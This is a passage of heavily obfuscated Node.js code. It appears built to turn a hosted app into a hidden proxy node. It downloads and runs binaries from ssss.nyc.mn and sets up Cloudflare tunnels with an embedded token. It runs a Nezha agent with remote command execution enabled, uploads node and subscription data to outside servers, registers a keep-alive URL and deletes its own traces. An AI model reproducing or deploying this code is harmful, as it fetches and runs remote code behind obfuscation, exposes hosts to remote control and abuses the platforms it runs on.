_0x513d56={_0x44eee2:0x132},_0x4e0e02=_0x241c,_0x254bf0=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x254bf0[_0x4e0e02(0xd3)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x254bf0[_0x4e0e02(0xd3)](phpPath);process['platform']==='win32'?exec(_0x4e0e02(_0x29430e._0x2a3459)+_0x254bf0[_0x4e0e02(_0x29430e._0x456308)]('\x20')+_0x4e0e02(_0x29430e._0x15c00b),_0x3083e8=>{const _0x5b9689=_0x4e0e02;console[_0x5b9689(0xe7)](),console[_0x5b9689(_0x513d56._0x44eee2)]('App\x20is\x20running'),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x254bf0[_0x4e0e02(0xa6)]('\x20')+_0x4e0e02(_0x29430e._0x144a6a),_0x438b55=>{const _0x258c8c=_0x4e0e02;console[_0x258c8c(_0x360c97._0x1de2f5)](),console['log'](_0x258c8c(_0x360c97._0x43b3b4)),console[_0x258c8c(_0x360c97._0x37e764)](_0x258c8c(0x10c));});},0x15f90);}function _0x4015(){const _0x277bda=['mkdirSync','floor','http','8SlDedt','unlinkSync','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','country_code','/api/add-subscriptions','countryCode','base64','push','/tunnel.yml\x20run','https://amd64.ssss.nyc.mn/bot','filter','win32','37074wvUwPU','./tmp','set','org','application/json','Unhandled\x20error\x20in\x20startserver:','ARGO_PORT','writeFileSync','railway.sbtfkd.qzz.io','tunnel.yml','CFPORT','test','/trojan-argo','https://arm64.ssss.nyc.mn/web','length','clear','del\x20/f\x20/q\x20','utf-8','8443','/api/delete-nodes','443','tls','listen','sub.txt','unshift','env','child_process','2083','295VBnriY','https://amd64.ssss.nyc.mn/v1','unlink','TunnelSecret','vmess','status','stringify','NAME','\x20>/dev/null\x202>&1','pkill\x20-f\x20\x22[','util','from','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','https://arm64.ssss.nyc.mn/agent','all','data','UPLOAD_URL','trojan','existsSync','\x0a\x20\x20tunnel:\x20','1282435anNENv','random','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','fileUrl','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','\x0a\x20\x20credentials-file:\x20','UUID','SERVER_PORT','Add\x20automatic\x20access\x20task\x20faild:\x20','includes','text/plain;\x20charset=utf-8','eyJhIjoiYmY2NDRjOTVmNmRlZGRiM2IwYmVhMWYxMDY1YWU3YWIiLCJ0IjoiOTkyNzEwYzktZjg1NS00ZTY2LWIwMWUtMDU4OWYwOTRkMzhiIiwicyI6Ik1qbGxOMlF6WVRNdE5XVmpOaTAwWlRGa0xUZzVZalV0TXpjMU1XUXdOelJrT1RZeiJ9','close','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','pop','split','arm64','854913dBiTQH','vless','https://amd64.ssss.nyc.mn/agent','2087','App\x20is\x20running','boot.log','\x20-c\x20','get','response','NEZHA\x20variable\x20is\x20empty,skip\x20running','php\x20running\x20error:\x20','/api/add-nodes','config.json','?encryption=none&security=tls&sni=','automatic\x20access\x20task\x20added\x20successfully','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','direct','aarch64','nohup\x20','forEach','&fp=firefox&type=ws&host=','charAt','arm','\x0avless://','ArgoDomain:','log','371936fycYRi','true','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','abcdefghijklmnopqrstuvwxyz','substring','https://arm64.ssss.nyc.mn/v1','&path=%2Ftrojan-argo%3Fed%3D2560#','fileName','createWriteStream','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','list.txt','\x20>/dev/null\x202>&1\x20&','\x20-p\x20','/sub.txt\x20saved\x20successfully','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','firefox','PROJECT_URL','/vmess-argo?ed=2560','AUTO_ACCESS','ARGO_AUTH','success','config.yaml','\x20>\x20nul\x202>&1','Subscription\x20uploaded\x20successfully','Download\x20','basename','\x20successfully','readFileSync','Error\x20in\x20startserver:','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','map','41304ogvPZC','1984960LENIos','/vless-argo','platform','quic','http\x20server\x20is\x20running\x20on\x20port:','catch','\x20already\x20exists','toString','\x20is\x20running','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','stream','block','https://amd64.ssss.nyc.mn/web','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','join','--tls','2053','pipe','error','/vmess-argo','113472XJiuCO','match','Error\x20executing\x20command:\x20','\x20is\x20created','express','Empowerment\x20failed\x20for\x20','send','readdirSync','freedom','Error\x20reading\x20boot.log:','2096','tcp','http://ip-api.com/json/','none','message','railway','440cpDtTT','\x20-c\x20\x22','isFile','Content-Type','finish','https://ipapi.co/json/','\x20failed:\x20','/dev/null','post','https://arm64.ssss.nyc.mn/bot','127.0.0.1','ct.877774.xyz','tunnel.json'];_0x4015=function(){return _0x277bda;};return _0x4015();}cleanFiles();async function AddVisitTask(){const _0x24366b={_0x65a297:0x127,_0x2f0454:0x110},_0x4f9501=_0x13a0ca;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4f9501(0x132)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x415de6=await axios[_0x4f9501(0xc4)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4f9501(0xdc)}});return console['log'](_0x4f9501(_0x24366b._0x65a297)),_0x415de6;}catch(_0x512b03){return console[_0x4f9501(0xaa)](_0x4f9501(_0x24366b._0x2f0454)+_0x512b03[_0x4f9501(0xba)]),null;}}async function startserver(){const _0x1131b5=_0x13a0ca;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x1bb94f){console[_0x1131b5(0xaa)](_0x1131b5(0x14f),_0x1bb94f);}}startserver()[_0x13a0ca(0x9d)](_0x2ced68=>{const _0x15bcdb={_0x1ed500:0xaa},_0x444bf6=_0x13a0ca;console[_0x444bf6(_0x15bcdb._0x1ed500)](_0x444bf6(0xdd),_0x2ced68);}),app[_0x13a0ca(0xee)](PORT,()=>console[_0x13a0ca(0x132)](_0x13a0ca(0x9c)+PORT+'!'));
